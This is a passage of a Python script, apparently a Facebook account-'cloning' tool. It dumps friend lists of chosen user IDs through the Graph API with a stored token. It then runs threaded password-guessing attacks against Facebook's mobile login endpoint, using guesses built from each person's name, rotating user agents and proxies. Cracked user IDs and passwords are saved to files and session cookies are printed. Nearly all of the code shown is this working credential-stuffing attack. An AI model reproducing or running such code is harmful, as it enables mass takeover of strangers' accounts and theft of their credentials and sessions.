            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\033[0;91m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\033[0;91m==================')
            geeh = input(' \033[95;1m[\033[95;1m•\033[95;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f' \033[95;1m[\033[92;1m•\033[95;1m] CP : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;95m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[95;1m[\033[92;1m•\033[95;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\033[0;95m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[35m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\033[0;93m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\033[0;93m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;93m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f'\033[95;1m[\033[92;1m•\033[95;1m] OK : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[95;1m[\033[92;1m•\033[95;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\033[0;91m==================')
        animation(' \033[95;1m[\033[92;1m•\033[95;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\033[0;91m==================')
        jum = int(input(' \033[95;1m[\033[92;1m•\033[95;1m] ENTER TARGET AMOUNT  : '))
        print('\033[0;91m==================')
    except ValueError:
        print('\033[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\033[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\033[92;1m•\033[95;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\033[0;95m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\033[0;91m==================')
        print(f' \033[92;1m[\033[92;1m•\033[92;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\033[0;91m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\033[0;93m==================')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;36m[ Put File Example:  /sdcard/king.txt  Etc...]')
    o = input('\033[95;1m[\033[92;1m+\033[95;1m] INPut FILE NAME :\033[95;1m ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;98m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\033[0;91m=============================')
    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY 𝐎𝐋𝐃 IDz")
    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 IDz")
    print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91mCLONING FOR 𝐌𝐈𝐗 IDz")
    print('\033[0;91m=============================')
    hu = input('\033[95;1m[\033[92;1m+\033[95;1m]CHOOSE :\033[95;1m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035𝐍𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
    print("\033[93;1m[\033[93;1m2\033[93;1m] METHOD 2 [\034𝐎𝐥𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[95;1m[\033[92;1m•\033[95;1m] CHOOSE : ')
    #os.system("xdg-open https://www.facebook.com/profile.php?id=100073213626571")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
    print('\x1b[38;5;50m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                    pwv.append(frs+'33')
                    pwv.append(frs+'333')
                    pwv.append(frs+'22')
                    pwv.append(frs+'222')
                    pwv.append(frs+'gaming')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'hosen')
                    pwv.append(frs+'Gaming')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'019')
                    pwv.append(frs+'017')
                    pwv.append(frs+'016')
                    pwv.append(frs+'018')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'hosen')
                   
                             
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                    pwv.append(frs+'33')
                    pwv.append(frs+'333')
                    pwv.append(frs+'22')
                    pwv.append(frs+'222')
                    pwv.append(frs+'gaming')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'hosen')
                    pwv.append(frs+'hossain')
                    pwv.append(frs+'Gaming')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'019')
                    pwv.append(frs+'017')
                    pwv.append(frs+'016')
                    pwv.append(frs+'018')
                    pwv.append(frs+'khan')
                    pwv.append(frs+'hosen')
                    
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python nono.py")
    exit() 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;95m{bo}[ALONE 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[ALONE-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;96m[ALONE-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ALONE 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ALONE-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ALONE-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()

